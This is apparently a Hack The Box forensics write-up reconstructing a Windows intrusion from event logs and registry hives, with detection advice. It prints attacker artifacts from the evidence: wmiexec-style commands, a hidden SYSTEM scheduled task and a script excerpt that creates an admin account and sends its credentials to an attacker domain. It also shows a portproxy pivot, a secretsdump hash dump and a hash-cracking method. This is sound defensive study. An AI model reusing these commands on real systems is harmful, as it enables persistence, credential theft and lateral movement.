# Challenge 02 – The Enduring Echo  

## 📖 Challenge Description  
LeStrade provided a Windows disk image containing forensic artifacts. Watson noticed abnormal CPU activity and anomalies in process logs, suggesting malicious persistence and lateral movement.  

**Environment:** Windows forensic disk image (EVTX logs, registry hives, artifacts)  
**Tools:** `evtxexport`/`evtx_dump`, `grep`, `awk`, `python3`, `regipy` (or manual hive parsing), `secretsdump.py` (Impacket), `hashcat` (mask attack)


My goal: analyze the logs and registry to reconstruct the attacker’s actions and answer the investigative questions.  

---

## 🛠️ Approach  

1. **Prepared the environment**  
   - Copied all `.evtx` files into a working directory on Kali.  
   - Converted selected logs (`Security.evtx`, `System.evtx`, `Windows PowerShell.evtx`, and `Microsoft-Windows-PowerShell%4Operational.evtx`) into `.xml` for easier parsing.  

2. **Initial log analysis**  
   - Focused on high-value Event IDs:  
     - **4688** → New Process Creation  
     - **4720** → User Account Created  
     - **4698** → Scheduled Task Created  
     - **4104/4105** → PowerShell ScriptBlock Logging   

   ```xml
   <?xml version="1.0" encoding="utf-8"?>
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
   <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="54849625-5478-4994-A5BA-3E3B0328C30D">
    </Provider>
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2025-08-24T22:50:58.805519Z">
    </TimeCreated>
    <EventRecordID>4270</EventRecordID>
    <Correlation>
    </Correlation>
    <Execution ProcessID="4" ThreadID="208">
    </Execution>
    <Channel>Security</Channel>
    <Computer>Heisen-9-WS-6</Computer>
    <Security>
    </Security>
   </System>
   <EventData>
    <Data Name="SubjectUserSid">S-1-5-20</Data>
    <Data Name="SubjectUserName">HEISEN-9-WS-6$</Data>
    <Data Name="SubjectDomainName">WORKGROUP</Data>
    <Data Name="SubjectLogonId">0x3e4</Data>
    <Data Name="NewProcessId">0x15cc</Data>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="TokenElevationType">%%1936</Data>
    <Data Name="ProcessId">0xf34</Data>
    <Data Name="CommandLine">cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">Werni</Data>
    <Data Name="TargetDomainName">HEISEN-9-WS-6</Data>
    <Data Name="TargetLogonId">0x4373b0</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
    <Data Name="MandatoryLabel">S-1-16-12288</Data>
   </EventData>
   </Event>
   ```


3. **Suspicious processes**  
   - Found repeated invocations of:  
     ```powershell
     powershell.exe -File C:\Users\Werni\AppData\Local\JM.ps1
     ```  
   - Observed attacker exploration with commands like `cd`, `dir`, `type`, `ipconfig`, `systeminfo`, and host file modifications.  

4. **Persistence & execution tool**  
   - Detected remote execution via **psexec.exe**.  
   - Identified persistence: a scheduled task named **SysHelper Update** running `JM.ps1` every 2 minutes as SYSTEM.  

5. **Registry & hive analysis**  
   - Extracted `SYSTEM` and `SAM` hives.  
   - Recovered NTLM hash of attacker-created account `svc_netupd`.  
   - Cracked the hash using `hashcat` with a custom mask derived from the script’s timestamp-based password generation.  

---

## 🔍 Analysis & Answers  

## Q1 — First Non-`cd` Command Executed

**Answer:** `systeminfo`

- Event ID **4688** (Process Creation) entries show `cmd.exe /Q /c …` with output redirected to `\\127.0.0.1\ADMIN$` — a PsExec-style pattern.
- In order of appearance, the **first** command after multiple `cd` calls is `systeminfo`.

### Key evidence (from `Security.evtx.xml`)
The earliest lines clearly show `systeminfo` as the first non-`cd`:

```xml
<Data Name="CommandLine">cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
<Data Name="CommandLine">cmd.exe /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
<Data Name="CommandLine">cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
```

---

## Q2 — Parent Process That Spawned the Attacker’s Commands

**Answer:** `C:\Windows\System32\wbem\WmiPrvSE.exe`

- Event ID **4688** (Process Creation) includes the `ParentProcessName` field.
- For every suspicious command tied to the loopback/ADMIN$ redirection pattern, `ParentProcessName` resolves to **WMI Provider Host**:
  `C:\Windows\System32\wbem\WmiPrvSE.exe`
- This aligns with **WMI-based remote execution** (often used to spawn `cmd.exe /Q /c ...` under WMI Provider Host).

### Key evidence (from `Security.evtx.xml`)
Representative lines (truncated for clarity) showing `ParentProcessName` and the spawned command:

```xml
<Event>
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="..."/>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
  </EventData>
</Event>

<Event>
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="..."/>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
  </EventData>
</Event>
```

---

## Q3 — Remote-Execution Tool Used

**Answer:** `wmiexec.py`

- **Parent process:** `C:\Windows\System32\wbem\WmiPrvSE.exe` (WMI Provider Host) for all suspicious 4688 events.
- **Output redirection pattern:** `cmd.exe /Q /c <command> 1> \\127.0.0.1\ADMIN$\__... 2>&1`
- **ADMIN$ share usage:** Writes command output to the target’s **administrative share** over **loopback**, a hallmark of Impacket’s **`wmiexec.py`**.
- **No PsExec service artifacts:** No transient service (e.g., `PSEXESVC`) or Event ID 7045 “Service installed,” which typically accompany `psexec.exe`.

### Key evidence (from `Security.evtx.xml`)
Representative lines (truncated for clarity):

```xml
<Event>
  <System>
    <EventID>4688</EventID>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
  </EventData>
</Event>

<Event>
  <System>
    <EventID>4688</EventID>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\wbem\WmiPrvSE.exe</Data>
  </EventData>
</Event>
```

---

## Q4 — Attacker’s IP Address

**Answer:** `10.129.242.110`

- A successful **logon event (ID 4624)** just before the malicious command sequence shows the source `IpAddress`.
- The attacker also **modified the hosts file** to map `NapoleonsBlackPearl.htb` to the same IP, corroborating the origin.

### Key evidence

**Security.evtx — Event ID 4624 (Logon)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="54849625-5478-4994-A5BA-3E3B0328C30D"></Provider>
    <EventID>4624</EventID>
    <!-- SNIP -->
  </System>
  <EventData>
    <!-- ... -->
    <Data Name="TargetUserName">Werni</Data>
    <!-- ... -->
    <Data Name="IpAddress">10.129.242.110</Data>
    <!-- ... -->
  </EventData>
</Event>
```
**Security.evtx — Process Creation (4688) echo to hosts**
```xml
<Data Name="CommandLine">
  cmd.exe /Q /c cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
  1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1
</Data>
```
- The same IP appears both as the source of the 4624 logon and in the hosts file modification, strengthening attribution.

---

## Q5 — First Element in the Attacker’s Persistence Chain

**Answer:** `SysHelper Update`

- The earliest persistence action is the creation of a **Scheduled Task** named **“SysHelper Update”** that runs a hidden PowerShell script as **SYSTEM** every **2 minutes**.

### Key evidence (from `Security.evtx.xml`)
```xml
<Data Name="CommandLine">
  cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f
  1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1
</Data>
```

---

## Q6 — Script Executed by the Persistence Mechanism

**Answer:** `C:\Users\Werni\Appdata\Local\JM.ps1`

- The scheduled task **SysHelper Update** runs PowerShell with `-File` pointing to `JM.ps1` under the user’s Local AppData path.

### Evidence — Task Creation
**Command used**

```bash

╭─rrs-hum@KaliLinux in ~/HackTheBox/Holmes/The_Enduring_Echo/C/Windows/System32/winevt/logs/enduring_echo_xmls
╰$ grep -n 'schtasks /create' Security.xml
158636:    <Data Name="CommandLine">cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1</Data>
```

---

## Q7 — Local Account Created

**Answer:** `svc_netupd`

- The attacker’s script (`JM.ps1`) randomly selects a username from a fixed list and creates it with admin/RDP group membership.
- A **Security** event **ID 4720** (“A user account was created”) shows the actual created username: **`svc_netupd`**.

### Key evidence

**Excerpt from `JM.ps1` (username selection & creation)**
```bash
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
# ...
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"
    # ...
    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser
    # Exfil:
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```
**Security.evtx.xml — Event ID 4720 (User Account Created)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="54849625-5478-4994-A5BA-3E3B0328C30D"></Provider>
    <EventID>4720</EventID>
    <!-- SNIP -->
    <TimeCreated SystemTime="2025-08-24T23:05:09.764658Z"></TimeCreated>
  </System>
  <EventData>
    <!-- SNIP -->
    <Data Name="TargetUserName">svc_netupd</Data>
  </EventData>
</Event>
```

---

## Q8 — Domain Used for Credential Exfiltration

**Answer:** `NapoleonsBlackPearl.htb`

- The attacker added a hosts entry mapping `NapoleonsBlackPearl.htb` to the same IP used in the intrusion.
- The persistence script (`JM.ps1`) exfiltrates the created username/password to a URL on that domain via `Invoke-WebRequest`.

### Key evidence

Hosts file modification (from `Security.evtx.xml`, Event ID 4688)**
```xml
<Data Name="CommandLine">
  cmd.exe /Q /c cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
  1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1
</Data>
```

---

## Q9 — Password Generated by the Attacker’s Script

**Answer:** `Watson_20250824160509`

---

1. **Password format from the script**  
   `JM.ps1` constructs the password as `Watson_YYYYMMDDHHMMSS`:
   ```bash
   $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
   $password  = "Watson_$timestamp"
   ```
2. **Extract the NTLM hash for the created user**
- Use the SYSTEM hive’s bootKey to decrypt the SAM and dump local hashes:
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL > secretsdump_local.txt
```
3. **Time-box candidates using event logs**
- From Security.evtx (Event ID 4720) the account was created at 2025-08-24 16:05:09Z, so generate candidate Watson_YYYYMMDDHHMMSS values around that second.

4. **Match candidate → NTLM**
- Compute NTLM (MD4 of UTF-16LE) for candidates and compare to the dumped NT hash.
**Match found:** Watson_20250824160509
  
```bash
╭─rrs-hum@KaliLinux in ~/HackTheBox/Holmes/The_Enduring_Echo/C/Windows/System32/config/SAM_SYSTEM 
╰$ ls                      
hashcat_input.txt  SAM  struct  SYSTEM
pass_wordlist.txt  secretsdump_local.txt  sys  user_ntlm.txt
```
- Impacket secretsdump.py output (local SAM + SYSTEM)
```bash
╭─rrs-hum@KaliLinux in ~/HackTheBox/Holmes/The_Enduring_Echo/C/Windows/System32/config/SAM_SYSTEM 
╰$ cat secretsdump_local.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3a2999e73d3448fb21e14bbd9a9480d1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:02679f6b636628c0822c7f9836b84282:::
Werni:1002:aad3b435b51404eeaad3b435b51404ee:0fa16c6a581bf468c6a83510926b8358:::
svc_netupd:1003:aad3b435b51404eeaad3b435b51404ee:532303a6fa70b02c905f950b60d7da51:::
[*] Cleaning up...
```
- Event log timing (user creation)
```xml
<EventID>4720</EventID>
<TimeCreated SystemTime="2025-08-24T16:05:09.764658Z" />
<Data Name="TargetUserName">svc_netupd</Data>
```

---

## Q10 — Internal Pivot Target IP

**Answer:** `192.168.1.101`

- A `netsh portproxy` command in the logs configures a v4→v4 TCP forward from local port **9999** to **192.168.1.101:22**, indicating the attacker pivoted to the internal host at **192.168.1.101**.

### Key evidence 
```xml
<Data Name="CommandLine">
  netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
</Data>
```

---

## Q11 — Forwarded TCP Port on the Victim

**Answer:** `9999`

### Why this is correct
- The `netsh portproxy` command configures a listener on **port 9999** that forwards to the internal host’s SSH port (22).

### Key evidence (from `Security.evtx.xml`)
```xml
<Data Name="CommandLine">
  netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
</Data>
```

---

## Q12 — Registry Path for Persistent IPv4→IPv4 Portproxy Mappings

**Answer:** `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

- Windows stores **persistent** `netsh interface portproxy add v4tov4 ...` rules under the PortProxy service key.
- Although offline hives often show `ControlSet00X`, the canonical path (and the expected answer) uses **`CurrentControlSet`**.

### Evidence (from my offline SYSTEM hive)
Using `reglookup` on the extracted `SYSTEM` hive:
```bash
% reglookup C/Windows/System32/config/SYSTEM 2>&1 | grep v4tov4
/ControlSet001/Services/PortProxy/v4tov4,KEY,,2025-08-24 23:10:05
/ControlSet001/Services/PortProxy/v4tov4/tcp,KEY,,2025-08-24 23:10:05
/ControlSet001/Services/PortProxy/v4tov4/tcp/0.0.0.0%2F9999,SZ,192.168.1.101/22,
```

---

## Q13 — MITRE ATT&CK Technique ID (Pivot via Port Proxy)

**Answer:** `T1090.001`

- The attacker enabled pivoting by configuring **`netsh interface portproxy add v4tov4 ...`**, creating a local TCP listener that forwards to an internal host.
- This maps to **MITRE ATT&CK** Technique **T1090** (*Proxy*) — **Sub-technique `.001` — Internal Proxy**.

---

## Q14 — Command Used to Enable Command-Line Logging

**Answer:**  
`reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f`

- Enabling `ProcessCreationIncludeCmdLine_Enabled` = **1** makes Event ID **4688** include the full `CommandLine` field, which is exactly what we observed throughout the logs.

### Key evidence (from PowerShell history)
File: `C/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`
```text
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
```

---

## 🧠 Lessons Learned

- **Turn on the right logs.** Enable 4688 *with* command-line and PowerShell 4104. It made the whole story visible.
- **WMI leaves tracks.** `WmiPrvSE.exe → cmd.exe/powershell.exe` is a strong sign of WMI remote execution.
- **ADMIN$ + 127.0.0.1 pattern = wmiexec.py.** Output redirection to `\\127.0.0.1\ADMIN$` is a clear giveaway.
- **Persistence hides in plain sight.** A harmless name (e.g., “SysHelper Update”) ran a script as **SYSTEM** every 2 minutes.
- **PortProxy = quiet pivot.** Rules live at `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`.
- **Scripts leak secrets.** Timestamp-based passwords are easy to recover from hashes.
- **Hosts file changes matter.** The added line tied the attack domain to the attacker’s IP.
- **Firewall tampering is high signal.** `netsh advfirewall set allprofiles state off` should alert immediately.

---

## 🛡️ Quick Detections 

- Alert when **`WmiPrvSE.exe`** spawns **`cmd.exe`/`powershell.exe`**.
- Alert when command lines contain **`\\127.0.0.1\ADMIN$`**.
- Alert on **new SYSTEM scheduled tasks**, especially running scripts from **`%USERPROFILE%\AppData\Local\`**.
- Alert on **`netsh interface portproxy add v4tov4`** and changes under **`...\PortProxy\v4tov4\tcp`**.
- Alert on **hosts file** edits and **firewall off** commands.

---

## 🤔 Reflections

- **What worked:** Full command-line logging and PowerShell logs quickly revealed the technique, target IP, and exfil domain.
- **What was tricky:** Offline registry showed `ControlSet001` while answers expect `CurrentControlSet`. They map to the same place at runtime.
- **Next time I’ll do this first:**  
  1) Filter 4688 by `ParentProcessName = WmiPrvSE.exe`.  
  2) Grep logs for `portproxy` and `hosts`.  
  3) Check Task Scheduler logs and the `PortProxy` registry key.

---

## ✅ Action Checklist

- [ ] Ensure **4688 + CommandLine** and **4104** are enabled.
- [ ] Add alerts for **WMI → cmd/powershell** and **ADMIN$ loopback redirection**.
- [ ] Monitor **SYSTEM tasks** and **`...\PortProxy\v4tov4\tcp`**.
- [ ] Protect **hosts file** and prevent **firewall disable** without approval.
- [ ] Avoid timestamp-based or predictable passwords in scripts.
